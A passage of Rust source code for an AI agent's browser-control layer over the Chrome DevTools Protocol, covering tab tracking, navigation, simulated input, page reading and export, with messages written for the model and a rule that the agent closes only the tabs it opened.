                    if fresh && t.kind == "page" {
                        // A page that appears is shown at once: what is in
                        // front is no longer what this hand last put there.
                        self.active = None;
                        // A page opened by a page Syn is driving is Syn's
                        // doing, and Syn's to close.
                        if let Some(opener) = top_string(info, "openerId")
                            && (self.opened.contains(&opener) || self.sessions.contains_key(&opener))
                        {
                            self.opened.insert(t.id.clone());
                            self.notes.push(format!(
                                "a new tab opened ({}): {}. Use it with open{{\"app\":\"browser\",\"path\":\"{}\"}}",
                                if t.url.is_empty() { "loading" } else { t.url.as_str() },
                                alias_of(&t.id),
                                alias_of(&t.id)
                            ));
                        }
                    }
                    match self.targets.iter_mut().find(|x| x.id == t.id) {
                        Some(x) => *x = t,
                        None => self.targets.push(t),
                    }
                }
            }
            "Target.targetDestroyed" => {
                if let Some(id) = top_string(params, "targetId") {
                    self.targets.retain(|t| t.id != id);
                    self.opened.remove(&id);
                    if self.active.as_deref() == Some(id.as_str()) {
                        self.active = None;
                    }
                    if let Some(s) = self.sessions.remove(&id) {
                        self.loading.remove(&s);
                    }
                }
            }
            "Target.detachedFromTarget" => {
                if let Some(s) = top_string(params, "sessionId") {
                    self.sessions.retain(|_, v| *v != s);
                    self.loading.remove(&s);
                }
            }
            "Inspector.targetCrashed" => {
                self.notes.push("the page crashed. Reload it with the reload verb, or open it again".into());
            }
            _ => {}
        }
    }

    /// Bring a tab to the front if it is not there. Only a switch costs a
    /// call, and only a switch raises the window: asking for a tab that is
    /// already in front, on every call, would make Syn's window take the
    /// foreground from whatever the person is doing in another program.
    fn front(&mut self, id: &str) -> std::io::Result<()> {
        if self.active.as_deref() == Some(id) {
            return Ok(());
        }
        match self.call("Target.activateTarget", &format!("{{\"targetId\":{}}}", js_string(id)), None) {
            // A target that cannot be activated (a worker) is no reason to
            // refuse the call; a socket that is gone is.
            Err(e) if !e.to_string().starts_with("cdp ") => return Err(e),
            _ => {}
        }
        self.active = Some(id.to_string());
        Ok(())
    }

    /// Attach to a target and cache its session. `flatten` keeps every
    /// session on this one socket instead of opening a socket per page.
    pub fn attach(&mut self, target_id: &str) -> std::io::Result<String> {
        if let Some(s) = self.sessions.get(target_id) {
            return Ok(s.clone());
        }
        let params = format!("{{\"targetId\":{},\"flatten\":true}}", js_string(target_id));
        let reply = self.call("Target.attachToTarget", &params, None)?;
        let result = top_value(&reply, "result").unwrap_or("{}");
        let sid = top_string(result, "sessionId").ok_or_else(|| other(format!("no sessionId in attach reply: {reply}")))?;
        self.sessions.insert(target_id.into(), sid.clone());
        // Dialogs and loading are reported only to a page that has asked.
        // Not every target is a page (a worker has no Page domain), and
        // that is no reason to refuse it.
        let _ = self.call("Page.enable", "{}", Some(&sid));
        self.loading.insert(sid.clone(), HashSet::new());
        Ok(sid)
    }

    /// Capture the page as a PNG.
    ///
    /// Not a script, so it cannot go through `page_script`: CDP returns the
    /// image as base64 inside the reply. Exposed as `export png`, because
    /// writing a handle out to a file is exactly what `export` means.
    pub fn screenshot(&mut self, session: &str) -> std::io::Result<Vec<u8>> {
        let reply = self.call("Page.captureScreenshot", "{\"format\":\"png\",\"captureBeyondViewport\":false}", Some(session))?;
        let result = top_value(&reply, "result").unwrap_or("{}");
        let data = top_string(result, "data").ok_or_else(|| other("no image data in the capture reply".into()))?;
        crate::ws::un_b64(&data).ok_or_else(|| other("capture reply was not valid base64".into()))
    }

    /// The page printed to PDF.
    fn pdf(&mut self, session: &str) -> std::io::Result<Vec<u8>> {
        let reply = self.call("Page.printToPDF", "{\"printBackground\":true,\"preferCSSPageSize\":true}", Some(session))?;
        let result = top_value(&reply, "result").unwrap_or("{}");
        let data = top_string(result, "data").ok_or_else(|| other("no document data in the print reply".into()))?;
        crate::ws::un_b64(&data).ok_or_else(|| other("print reply was not valid base64".into()))
    }

    /// Evaluate one script in a page and decode the string it returned.
    pub fn eval(&mut self, session: &str, script: &str) -> std::io::Result<Reply> {
        let params = format!("{{\"expression\":{},\"returnByValue\":true,\"awaitPromise\":true}}", js_string(script));
        let reply = self.call("Runtime.evaluate", &params, Some(session))?;
        let result = top_value(&reply, "result").unwrap_or("{}");
        if let Some(ex) = top_value(result, "exceptionDetails") {
            let msg = top_value(ex, "exception")
                .and_then(|e| top_string(e, "description"))
                .or_else(|| top_string(ex, "text"))
                .unwrap_or_else(|| "script threw".into());
            return Ok(Reply { ok: false, preview: String::new(), error: msg });
        }
        let inner = top_value(result, "result").unwrap_or("{}");
        let preview = top_string(inner, "value").unwrap_or_default();
        Ok(Reply { ok: true, preview, error: String::new() })
    }

    /// Run a function of `page.js` and decode what it said. `Err` is a
    /// sentence for the model: the script threw (no element matched, an
    /// ambiguous word, a frame it cannot enter) or the page would not run it.
    ///
    /// A page that is navigating destroys the world a script runs in, and an
    /// evaluate that lands in that moment fails with a message about a
    /// context that is gone. That is a race, not an answer: the call is
    /// repeated once after the page has settled.
    fn page(&mut self, session: &str, unit: &str, expr: &str) -> std::io::Result<Result<Value, String>> {
        let script = page_script(unit, expr);
        for attempt in 0..2 {
            let r = self.eval(session, &script);
            let r = match r {
                Err(e) if attempt == 0 && gone_world(&e.to_string()) => {
                    self.settle(session, Duration::from_millis(100), LOAD_MAX)?;
                    continue;
                }
                other => other?,
            };
            if !r.ok {
                if attempt == 0 && gone_world(&r.error) {
                    self.settle(session, Duration::from_millis(100), LOAD_MAX)?;
                    continue;
                }
                return Ok(Err(r.error));
            }
            let v = crate::json::parse(&r.preview).map_err(|e| other(format!("page script answered with something that is not JSON: {e}")))?;
            if let Some(t) = v.get("threw").and_then(Value::as_str) {
                return Ok(Err(t.to_string()));
            }
            return Ok(Ok(v));
        }
        Ok(Err("the page kept changing under the call; try again".into()))
    }

    // ---------------------------------------------------------- waiting

    /// Wait for what an action set going to finish.
    ///
    /// For `look` the page is watched for a navigation starting; if one
    /// did, it is waited out (up to `max`), and then a beat longer for a
    /// page that redirects itself. A press that starts nothing costs `look`
    /// and no more. This is how a click on a link is followed by a read of
    /// the page it led to, not of the one it left.
    fn settle(&mut self, session: &str, look: Duration, max: Duration) -> std::io::Result<()> {
        let began = Instant::now();
        let end = began + max;
        let busy = |c: &Self| c.loading.get(session).is_some_and(|f| !f.is_empty());
        // Whatever is already waiting, then whatever comes in `look`.
        let until = began + look;
        loop {
            let left = until.saturating_duration_since(Instant::now());
            match self.ws.poll_text(left.max(Duration::from_millis(1)))? {
                Some(m) => self.on_event(&m),
                None => break,
            }
            if Instant::now() >= until && !self.ws.has_buffered() {
                break;
            }
        }
        while busy(self) && Instant::now() < end {
            if let Some(m) = self.ws.poll_text(Duration::from_millis(200))? {
                self.on_event(&m);
            }
            // A page that finished and started again (a script redirect).
            if !busy(self)
                && let Some(m) = self.ws.poll_text(Duration::from_millis(150))?
            {
                self.on_event(&m);
            }
        }
        Ok(())
    }

    fn snapshot(&mut self, session: &str) -> std::io::Result<Snap> {
        Ok(match self.page(session, ":doc", "S.page()")? {
            Ok(v) => Snap { title: jstr(&v, "title"), url: jstr(&v, "url"), status: jnum(&v, "status") as u32 },
            Err(_) => Snap::default(),
        })
    }

    /// What an action did to where the page is, in words; empty when it
    /// changed nothing a person would see in the address bar or the title.
    fn arrived(&mut self, session: &str, handle: &str, before: &Snap) -> std::io::Result<String> {
        let after = self.snapshot(session)?;
        if after.url.is_empty() || after == *before {
            return Ok(String::new());
        }
        let mut s = String::new();
        if after.url != before.url {
            s.push_str(&format!(" The page is now {:?} at {}", after.title, after.url));
            if after.status >= 400 {
                s.push_str(&format!(" (HTTP {}: the server answered with an error, so this is probably not the page that was wanted)", after.status));
            }
            s.push('.');
            s.push_str(&format!(" To see what is on it: read{}", crate::json::obj(vec![("handle", crate::json::s(handle)), ("selector", crate::json::s(":map"))]).to_json()));
        } else {
            s.push_str(&format!(" The page's title is now {:?}.", after.title));
        }
        Ok(s)
    }

    // ------------------------------------------------------------ input

    fn mouse(&mut self, session: &str, kind: &str, x: f64, y: f64, pressed: bool) -> std::io::Result<()> {
        let params = if kind == "mouseMoved" {
            format!("{{\"type\":\"mouseMoved\",\"x\":{x},\"y\":{y}}}")
        } else {
            format!("{{\"type\":\"{kind}\",\"x\":{x},\"y\":{y},\"button\":\"left\",\"buttons\":{},\"clickCount\":1}}", u8::from(pressed))
        };
        self.call("Input.dispatchMouseEvent", &params, Some(session)).map(|_| ())
    }

    /// A press as a person makes one: the pointer arrives, goes down, comes up.
    fn click_at(&mut self, session: &str, x: f64, y: f64) -> std::io::Result<()> {
        self.mouse(session, "mouseMoved", x, y, false)?;
        self.mouse(session, "mousePressed", x, y, true)?;
        self.mouse(session, "mouseReleased", x, y, false)
    }

    fn key_event(&mut self, session: &str, kind: &str, mods: u32, k: &Key) -> std::io::Result<()> {
        let mut p = format!("{{\"type\":\"{kind}\",\"modifiers\":{mods},\"key\":{},\"windowsVirtualKeyCode\":{}", js_string(&k.key), k.vk);
        if !k.code.is_empty() {
            p.push_str(&format!(",\"code\":{}", js_string(&k.code)));
        }
        if kind == "keyDown"
            && let Some(t) = &k.text
        {
            p.push_str(&format!(",\"text\":{}", js_string(t)));
        }
        p.push('}');
        self.call("Input.dispatchKeyEvent", &p, Some(session)).map(|_| ())
    }

    fn press_key(&mut self, session: &str, mods: u32, k: &Key) -> std::io::Result<()> {
        // A key that types is a `keyDown` carrying its text; one that does
        // not (an arrow, Tab, a shortcut) is a `rawKeyDown`.
        let down = if k.text.is_some() { "keyDown" } else { "rawKeyDown" };
        self.key_event(session, down, mods, k)?;
        self.key_event(session, "keyUp", mods, k)
    }

    /// Type text key by key, which is what a page that completes as you type
    /// listens for. A character with no key of its own (an accent, a symbol
    /// from another script) is inserted whole.
    fn type_text(&mut self, session: &str, text: &str) -> std::io::Result<()> {
        for c in text.chars() {
            if c == '\n' {
                let (m, k) = parse_key("Enter").expect("Enter is a key");
                self.press_key(session, m, &k)?;
            } else if let Some((mods, k)) = char_key(c) {
                self.press_key(session, mods, &k)?;
            } else {
                self.call("Input.insertText", &format!("{{\"text\":{}}}", js_string(&c.to_string())), Some(session))?;
            }
        }
        Ok(())
    }

    // ------------------------------------------------------- navigation

    /// Go to an address and wait for it to load. `Err` is a page that could
    /// not be loaded, in words.
    fn go(&mut self, session: &str, url: &str) -> std::io::Result<Result<(), String>> {
        let reply = self.call("Page.navigate", &format!("{{\"url\":{}}}", js_string(url)), Some(session))?;
        let result = top_value(&reply, "result").unwrap_or("{}");
        if let Some(err) = top_string(result, "errorText") {
            return Ok(Err(net_error(&err, url)));
        }
        self.settle(session, Duration::from_millis(60), LOAD_MAX)?;
        Ok(Ok(()))
    }

    /// Walk the history `by` entries (-1 is back).
    fn history(&mut self, session: &str, by: i64) -> std::io::Result<Result<(), String>> {
        let reply = self.call("Page.getNavigationHistory", "{}", Some(session))?;
        let parsed = crate::json::parse(&reply).map_err(|e| other(format!("Page.getNavigationHistory: {e}")))?;
        let result = parsed.get("result");
        let at = result.map(|r| jnum(r, "currentIndex") as i64).unwrap_or(0);
        let entries = result.and_then(|r| r.get("entries")).and_then(Value::as_arr).unwrap_or(&[]);
        let want = at + by;
        let Some(entry) = usize::try_from(want).ok().and_then(|i| entries.get(i)) else {
            return Ok(Err(if by < 0 { "there is no earlier page to go back to".into() } else { "there is no later page to go forward to".into() }));
        };
        let id = jnum(entry, "id") as i64;
        self.call("Page.navigateToHistoryEntry", &format!("{{\"entryId\":{id}}}"), Some(session))?;
        self.settle(session, Duration::from_millis(60), LOAD_MAX)?;
        Ok(Ok(()))
    }

    // ------------------------------------------------------ opening tabs

    /// What `open` says for a tab: its name, then what is on it.
    fn arrive_at(&mut self, id: &str, verb: &str) -> std::io::Result<Reply> {
        let session = self.attach(id)?;
        self.front(id)?;
        let alias = alias_of(id);
        let handle = format!("web:{alias}::doc");
        let snap = self.snapshot(&session)?;
        let map = match self.page(&session, ":doc", "S.map(2400)")? {
            Ok(v) => jstr(&v, "text"),
            Err(e) => format!("(the page could not be listed: {e})"),
        };
        let mut said = format!("{verb} {alias} as handle {handle}.");
        if snap.status >= 400 {
            said.push_str(&format!(" The server answered HTTP {}: this is probably not the page that was wanted.", snap.status));
        }
        Ok(good(format!("{alias}|{said}\n{map}")))
    }

    /// `open`: an address opens a tab, and part of a title, an address or a
    /// tab's name finds one that is open. The answer starts with the name
    /// of the tab and a `|`, which the desk turns into the handle.
    pub fn open_target(&mut self, want: &str) -> std::io::Result<Reply> {
        let want = want.trim();
        let explicit = has_scheme(want);
        if !explicit && let Some(t) = self.target_for(want)?.filter(|t| t.kind == "page") {
            return self.arrive_at(&t.id, "using");
        }
        if !explicit && !host_like(want) {
            return Ok(bad(format!(
                "no browser tab has {want:?} in its title or address. The tabs open are: {}. Use part of one of those, or open an address: open{{\"app\":\"browser\",\"path\":\"https://example.com\"}}",
                tab_list(&self.targets)
            )));
        }
        let url = match check_url(want, &self.policy) {
            Ok(u) => u,
            Err(e) => return Ok(bad(e)),
        };
        // A tab already showing exactly this address is used again.
        if let Some(t) = self.targets.iter().find(|t| t.kind == "page" && t.url == url).cloned() {
            return self.arrive_at(&t.id, "using");
        }
        // A browser Syn started has one empty tab; use it rather than
        // leaving it empty beside the page.
        let blank = (self.child.is_some())
            .then(|| self.targets.iter().filter(|t| t.kind == "page").collect::<Vec<_>>())
            .filter(|p| p.len() == 1 && p[0].url == "about:blank")
            .map(|p| p[0].id.clone());
        let id = match blank {
            Some(id) => id,
            None => {
                let reply = self.call("Target.createTarget", "{\"url\":\"about:blank\"}", None)?;
                let result = top_value(&reply, "result").unwrap_or("{}");
                let id = top_string(result, "targetId").ok_or_else(|| other(format!("no targetId in createTarget reply: {reply}")))?;
                if !self.targets.iter().any(|t| t.id == id) {
                    self.targets.push(Target { id: id.clone(), kind: "page".into(), title: String::new(), url: "about:blank".into() });
                }
                id
            }
        };
        self.opened.insert(id.clone());
        let session = self.attach(&id)?;
        if let Err(e) = self.go(&session, &url)? {
            return Ok(bad(format!("opened {} but {e}", alias_of(&id))));
        }
        self.arrive_at(&id, "opened")
    }

    // ----------------------------------------------------------- the ops

    fn read(&mut self, session: &str, unit: &str, selector: &str) -> std::io::Result<Reply> {
        let sel = selector.trim();
        if sel == ":map" {
            return Ok(match self.page(session, unit, "S.map(3600)")? {
                Ok(v) => good(jstr(&v, "text")),
                Err(e) => bad(e),
            });
        }
        let (s, off) = split_offset(sel);
        Ok(match self.page(session, unit, &format!("S.read({}, {off})", js_string(s)))? {
            Err(e) => bad(e),
            Ok(v) => {
                if !jstr(&v, "hidden").is_empty() {
                    return Ok(good(format!("({} is not visible on the page, so it has no text to read)", jstr(&v, "hidden"))));
                }
                let text = jstr(&v, "text");
                let total = jnum(&v, "total") as usize;
                let shown = text.chars().count();
                let from = jnum(&v, "off") as usize;
                if total > from + shown && shown > 0 {
                    good(format!("{text}\n[characters {from} to {} of {total}. The rest: read selector {:?}]", from + shown, format!("{s}@{}", from + shown)))
                } else {
                    good(text)
                }
            }
        })
    }

    fn write(&mut self, session: &str, unit: &str, selector: &str, value: &str) -> std::io::Result<Reply> {
        Ok(match self.page(session, unit, &format!("S.write({}, {})", js_string(selector), js_string(value)))? {
            Err(e) => bad(e),
            Ok(v) if !jbool(&v, "ok") => bad(jstr(&v, "say")),
            Ok(v) => {
                let mut s = format!("wrote {} chars into {}", value.chars().count(), jstr(&v, "d"));
                if !jstr(&v, "now").is_empty() {
                    s.push_str(&format!("; it now holds {:?}", jstr(&v, "now")));
                }
                if v.get("same").is_some() && !jbool(&v, "same") {
                    s.push_str(". The page changed what was written, so it did not keep it as given: its own script decided the value");
                }
                if !jstr(&v, "note").is_empty() {
                    s.push_str(&format!(" ({})", jstr(&v, "note")));
                }
                good(s)
            }
        })
    }

    fn click(&mut self, session: &str, handle: &str, unit: &str, selector: &str, toggle: bool) -> std::io::Result<Reply> {
        let before = self.snapshot(session)?;
        let prep = match self.page(session, unit, &format!("S.prep({}, \"click\")", js_string(selector)))? {
            Err(e) => return Ok(bad(e)),
            Ok(v) if !jbool(&v, "ok") => return Ok(bad(jstr(&v, "say"))),
            Ok(v) => v,
        };
        self.click_at(session, jnum(&prep, "x"), jnum(&prep, "y"))?;
        self.settle(session, NAV_LOOK, LOAD_MAX)?;
        let n = jnum(&prep, "n") as usize;
        let mut said = format!("clicked {}{}.", jstr(&prep, "d"), if n > 1 { format!(" (the first of {n} that match)") } else { String::new() });
        let ty = jstr(&prep, "type");
        let a_switch = toggle || ty == "checkbox" || ty == "radio";
        if a_switch
            && let Ok(st) = self.page(session, unit, &format!("S.state({})", js_string(&jstr(&prep, "sel"))))?
            && st.get("checked").is_some()
        {
            said.push_str(if jbool(&st, "checked") { " It is now checked." } else { " It is now unchecked." });
        }
        said.push_str(&self.arrived(session, handle, &before)?);
        Ok(good(said))
    }

    fn do_type(&mut self, session: &str, unit: &str, selector: &str, text: &str) -> std::io::Result<Reply> {
        let before_field = match self.page(session, unit, &format!("S.field({}, false)", js_string(selector)))? {
            Err(e) => return Ok(bad(e)),
            Ok(v) if !jbool(&v, "ok") => return Ok(bad(jstr(&v, "say"))),
            Ok(v) => v,
        };
        self.type_text(session, text)?;
        self.settle(session, Duration::from_millis(80), LOAD_MAX)?;
        self.typed = Some((session.to_string(), selector.trim().to_string()));
        let mut said = format!("typed {} characters into {}", text.chars().count(), jstr(&before_field, "d"));
        if let Ok(st) = self.page(session, unit, &format!("S.state({})", js_string(&jstr(&before_field, "sel"))))?
            && !jstr(&st, "now").is_empty()
        {
            said.push_str(&format!("; it now holds {:?}", jstr(&st, "now")));
        }
        said.push('.');
        Ok(good(said))
    }

    fn press(&mut self, session: &str, handle: &str, unit: &str, selector: &str, spec: &str, typed: Option<(String, String)>) -> std::io::Result<Reply> {
        let (mods, key) = match parse_key(spec) {
            Ok(k) => k,
            Err(e) => return Ok(bad(e)),
        };
        // Where the key went, when that was not the field named.
        let mut redrawn = String::new();
        if !selector.trim().is_empty() {
            match self.page(session, unit, &format!("S.focus({})", js_string(selector)))? {
                Err(e) if e.contains("no element matches") => {
                    // Seen on a search box with suggestions: typing into it
                    // made the page build a new field and drop the one that
                    // was typed into, and the next call named the old one.
                    // When that is the field just typed into and a field has
                    // the focus now, the key is meant for it: nothing else is
                    // plausible, and a refusal cost the model a step in every
                    // real search it ran. Otherwise, say what to do.
                    let meant = typed.is_some_and(|(s, sel)| s == session && sel == selector.trim());
                    let now = if meant { self.page(session, unit, "S.focused()")?.ok() } else { None };
                    match now {
                        Some(f) if jbool(&f, "field") => {
                            redrawn = format!(" The page redrew the field you typed into as you typed, so the key went to {}, which has the focus.", jstr(&f, "d"));
                        }
                        _ => {
                            return Ok(bad(format!(
                                "{e}. If you were typing into a field and the page redrew it as you typed (a search box with suggestions does), press the key without a selector: it goes to whatever has the focus"
                            )));
                        }
                    }
                }
                Err(e) => return Ok(bad(e)),
                Ok(v) if !jbool(&v, "ok") => return Ok(bad(jstr(&v, "say"))),
                Ok(_) => {}
            }
        }
        let before = self.snapshot(session)?;
        self.press_key(session, mods, &key)?;
        self.settle(session, NAV_LOOK, LOAD_MAX)?;
        let mut said = format!("pressed {spec}.{redrawn}");
        said.push_str(&self.arrived(session, handle, &before)?);
        Ok(good(said))
    }

    fn hover(&mut self, session: &str, unit: &str, selector: &str) -> std::io::Result<Reply> {
        let prep = match self.page(session, unit, &format!("S.prep({}, \"hover\")", js_string(selector)))? {
            Err(e) => return Ok(bad(e)),
            Ok(v) if !jbool(&v, "ok") => return Ok(bad(jstr(&v, "say"))),
            Ok(v) => v,
        };
        self.mouse(session, "mouseMoved", jnum(&prep, "x"), jnum(&prep, "y"), false)?;
        self.settle(session, Duration::from_millis(120), Duration::from_secs(3))?;
        Ok(good(format!("moved the pointer onto {}. What it reveals is not shown until the page is read again: read selector \":map\"", jstr(&prep, "d"))))
    }

    fn choose(&mut self, session: &str, handle: &str, unit: &str, selector: &str, text: &str) -> std::io::Result<Reply> {
        let before = self.snapshot(session)?;
        Ok(match self.page(session, unit, &format!("S.choose({}, {})", js_string(selector), js_string(text)))? {
            Err(e) => bad(e),
            Ok(v) if !jbool(&v, "ok") => bad(jstr(&v, "say")),
            Ok(v) => {
                self.settle(session, Duration::from_millis(250), LOAD_MAX)?;
                let mut s = format!("chose {:?} in {}.", jstr(&v, "now"), jstr(&v, "d"));
                s.push_str(&self.arrived(session, handle, &before)?);
                good(s)
            }
        })
    }

    fn scroll(&mut self, session: &str, unit: &str, selector: &str, dir: &str) -> std::io::Result<Reply> {
        Ok(match self.page(session, unit, &format!("S.scroll({}, {})", js_string(selector), js_string(dir)))? {
            Err(e) => bad(e),
            Ok(v) if !jbool(&v, "ok") => bad(jstr(&v, "say")),
            Ok(v) => {
                // Pages that load more as you reach the end do it on a timer.
                self.settle(session, Duration::from_millis(200), Duration::from_secs(5))?;
                good(format!("{}.", jstr(&v, "said")))
            }
        })
    }

    fn wait(&mut self, session: &str, unit: &str, args: &[(String, String)]) -> std::io::Result<Reply> {
        let (selector, text, rule) = (arg(args, "selector"), arg(args, "text"), arg(args, "rule"));
        if selector.trim().is_empty() && text.trim().is_empty() {
            return Ok(bad("wait: say what to wait for. `selector` waits for that element to be on the page, `text` for those words to be; rule \"gone\" waits for it to leave instead"));
        }
        let gone = rule.trim().eq_ignore_ascii_case("gone");
        let secs = arg(args, "name").trim().parse::<u64>().unwrap_or(10).clamp(1, 30);
        let what = if !selector.is_empty() { format!("{selector:?}") } else { format!("the words {text:?}") };
        let end = Instant::now() + Duration::from_secs(secs);
        loop {
            let expr = format!("S.check({}, {}, {})", js_string(selector), js_string(text), gone);
            if let Ok(v) = self.page(session, unit, &expr)?
                && jbool(&v, "met")
            {
                let there = jstr(&v, "why");
                return Ok(good(if gone { format!("{what} is gone.") } else if there.is_empty() { format!("{what} is on the page.") } else { format!("{there} is on the page.") }));
            }
            if Instant::now() >= end {
                return Ok(bad(format!(
                    "still waiting for {what} {} after {secs} s. The page may be slow, or what you expect never comes: read selector \":map\" to see what is there",
                    if gone { "to go" } else { "to appear" }
                )));
            }
            // The wait is also when a dialog or a redirect shows up.
            if let Some(m) = self.ws.poll_text(Duration::from_millis(150))? {
                self.on_event(&m);
            }
        }
    }

    fn find(&mut self, session: &str, unit: &str, text: &str, selector: &str) -> std::io::Result<Reply> {
        let _ = selector;
        Ok(match self.page(session, unit, &format!("S.find({})", js_string(text)))? {
            Err(e) => bad(e),
            Ok(v) if !jbool(&v, "ok") => bad(jstr(&v, "say")),
            Ok(v) => {
                let hits = v.get("hits").and_then(Value::as_arr).unwrap_or(&[]);
                let total = jnum(&v, "total") as usize;
                if hits.is_empty() {
                    let hidden = jnum(&v, "hidden") as usize;
                    return Ok(good(format!(
                        "{text:?} is not written anywhere on the page that can be seen{}.",
                        if hidden > 0 { format!(" ({hidden} hidden element(s) hold it, and what is hidden is not read)") } else { String::new() }
                    )));
                }
                let mut out = format!("{total} place(s) on the page say {text:?}:\n");
                for h in hits {
                    out.push_str(&format!("  {}  {:?}\n", jstr(h, "sel"), jstr(h, "snip")));
                }
                if total > hits.len() {
                    out.push_str(&format!("  ({} more not shown)\n", total - hits.len()));
                }
                good(out.trim_end().to_string())
            }
        })
    }

    fn export(&mut self, session: &str, unit: &str, format: &str, path: Option<&str>) -> std::io::Result<Reply> {
        if let Some(path) = path {
            let bytes = if format == "png" { self.screenshot(session)? } else { self.pdf(session)? };
            if let Some(dir) = std::path::Path::new(path).parent()
                && !dir.as_os_str().is_empty()
            {
                std::fs::create_dir_all(dir)?;
            }
            std::fs::write(path, &bytes)?;
            return Ok(good(format!("captured {path} ({} bytes)", bytes.len())));
        }
        Ok(match format {
            "title" => {
                let s = self.snapshot(session)?;
                good(format!("{} | {}", s.title, s.url))
            }
            "html" => match self.page(session, unit, "S.html(\"\", 0)")? {
                Ok(v) => good(jstr(&v, "text")),
                Err(e) => bad(e),
            },
            "summary" => match self.page(session, unit, "S.map(1200)")? {
                Ok(v) => good(jstr(&v, "text")),
                Err(e) => bad(e),
            },
            _ => return self.read(session, unit, ""),
        })
    }

    fn close_tab(&mut self, target: &Target) -> std::io::Result<Reply> {
        if !self.opened.contains(&target.id) {
            return Ok(bad(format!(
                "close: {} was already open when Syn came, so it is the person's to close. Syn closes only tabs it opened itself",
                alias_of(&target.id)
            )));
        }
        self.call("Target.closeTarget", &format!("{{\"targetId\":{}}}", js_string(&target.id)), None)?;
        self.targets.retain(|t| t.id != target.id);
        self.opened.remove(&target.id);
        self.sessions.remove(&target.id);
        Ok(good(format!("closed {}", alias_of(&target.id))))
    }

    /// The side events of a call, said after its result.
    fn with_notes(&mut self, mut reply: Reply) -> Reply {
        if self.notes.is_empty() {
            return reply;
        }
        let said = self.notes.drain(..).map(|n| format!("Also: {n}.")).collect::<Vec<_>>().join(" ");
        if reply.ok {
            reply.preview.push_str(&format!("\n{said}"));
        } else {
            reply.error.push_str(&format!("\n{said}"));
        }
        reply
    }
}

fn info_target(t: &Value) -> Target {
    let s = |k: &str| t.get(k).and_then(Value::as_str).unwrap_or("").to_string();
    Target { id: s("targetId"), kind: s("type"), title: s("title"), url: s("url") }
}

/// An error from a script that ran in a page that was being replaced.
fn gone_world(msg: &str) -> bool {
    let m = msg.to_ascii_lowercase();
    m.contains("context was destroyed") || m.contains("cannot find context") || m.contains("inspected target navigated") || m.contains("target closed")
}

/// Split `app:file:unit`. The unit keeps any further colons, so a selector
/// or url fragment survives intact.
pub fn split_handle(handle: &str) -> (&str, &str, &str) {
    let mut it = handle.splitn(3, ':');
    (it.next().unwrap_or(""), it.next().unwrap_or(""), it.next().unwrap_or(""))
}

impl<S: Read + Write + Deadline + std::fmt::Debug> LiveHand for Cdp<S> {
    fn dispatch_call(&mut self, call: &Call, handle: &str) -> std::io::Result<Reply> {
        // Refused before anything is sent to the browser.
        if let Err(why) = supported(call) {
            return Ok(bad(why));
        }
        let (_, file, unit) = split_handle(handle);
        let Some(target) = self.target_for(file)? else {
            return Ok(bad(format!(
                "no open tab matches {file:?}. The tabs open are: {}. Use the name of one (tab-xxxxx) as the middle part of the handle, or open the page again with `open`",
                tab_list(&self.targets)
            )));
        };
        let session = self.attach(&target.id)?;
        self.front(&target.id)?;
        let reply = match call {
            Call::Read(ReadArgs { selector }) => self.read(&session, unit, selector)?,
            Call::Write(WriteArgs { selector, values }) => self.write(&session, unit, selector, &text_of(values))?,
            Call::Format(FormatArgs { selector, style }) => {
                let pairs = style.iter().map(|(k, v)| format!("[{},{}]", js_string(k), js_string(v))).collect::<Vec<_>>().join(",");
                match self.page(&session, unit, &format!("S.style({}, [{pairs}])", js_string(selector)))? {
                    Ok(v) => good(format!("styled {} ({} properties)", jstr(&v, "d"), jnum(&v, "n") as usize)),
                    Err(e) => bad(e),
                }
            }
            Call::Export(ExportArgs { format, path, .. }) => self.export(&session, unit, format, path.as_deref())?,
            Call::Struct(StructArgs::Invoke { selector, action }) => match action.as_str() {
                "focus" => match self.page(&session, unit, &format!("S.focus({})", js_string(selector)))? {
                    Ok(v) if jbool(&v, "ok") => good(format!("focused {}", jstr(&v, "d"))),
                    Ok(v) => bad(jstr(&v, "say")),
                    Err(e) => bad(e),
                },
                a => self.click(&session, handle, unit, selector, a == "toggle")?,
            },
            Call::Struct(StructArgs::Office { verb, args, .. }) => {
                let (selector, text) = (arg(args, "selector"), arg(args, "text"));
                // Only a key press may use what was typed, and only the next one.
                let typed = if verb == "press" { self.typed.take() } else { None };
                if verb != "type" {
                    self.typed = None;
                }
                match verb.as_str() {
                    "goto" => match check_url(text, &self.policy) {
                        Err(e) => bad(e),
                        Ok(url) => {
                            let before = self.snapshot(&session)?;
                            match self.go(&session, &url)? {
                                Err(e) => bad(e),
                                Ok(()) => {
                                    let tail = self.arrived(&session, handle, &before)?;
                                    good(if tail.is_empty() { format!("loaded {url}.") } else { format!("went to {url}.{tail}") })
                                }
                            }
                        }
                    },
                    "type" => self.do_type(&session, unit, selector, text)?,
                    "press" => self.press(&session, handle, unit, selector, text, typed)?,
                    "scroll" => self.scroll(&session, unit, selector, text)?,
                    "hover" => self.hover(&session, unit, selector)?,
                    "choose" => self.choose(&session, handle, unit, selector, text)?,
                    "wait" => self.wait(&session, unit, args)?,
                    "find" => self.find(&session, unit, text, selector)?,
                    "back" | "forward" | "reload" => {
                        let before = self.snapshot(&session)?;
                        let moved = match verb.as_str() {
                            "back" => self.history(&session, -1)?,
                            "forward" => self.history(&session, 1)?,
                            _ => {
                                self.call("Page.reload", "{}", Some(&session))?;
                                self.settle(&session, Duration::from_millis(60), LOAD_MAX)?;
                                Ok(())
                            }
                        };
                        match moved {
                            Err(e) => bad(e),
                            Ok(()) => {
                                let tail = self.arrived(&session, handle, &before)?;
                                good(if tail.is_empty() { format!("{verb} done; the page is the same address.") } else { format!("{verb} done.{tail}") })
                            }
                        }
                    }
                    "close" => self.close_tab(&target)?,
                    _ => bad(format!("{verb} is not something a web page has")),
                }
            }
            Call::Undo | Call::Struct(_) => bad("not supported by the cdp hand"),
        };
        Ok(self.with_notes(reply))
    }

    /// `open`, the one request that names no handle.
    fn send_envelope(&mut self, line: &str) -> std::io::Result<Reply> {
        let v = crate::json::parse(line).map_err(|e| other(format!("not a request: {e}")))?;
        match v.get("method").and_then(Value::as_str) {
            Some("open") => {
                let want = v.at(&["args", "path"]).and_then(Value::as_str).unwrap_or("");
                let r = self.open_target(want)?;
                Ok(self.with_notes(r))
            }
            m => Err(other(format!("the browser hand answers `open` and the six ops, not {m:?}"))),
        }
    }
}

impl<S: Read + Write + Deadline> Drop for Cdp<S> {
    /// A browser Syn started goes with Syn. Asked politely first, so the
    /// profile is written out and a sign-in survives; then told. The job
    /// object that tethers it covers Syn being killed, which no destructor
    /// does.
    fn drop(&mut self) {
        let Some(mut child) = self.child.take() else { return };
        let _ = self.send_raw("Browser.close", "{}", None);
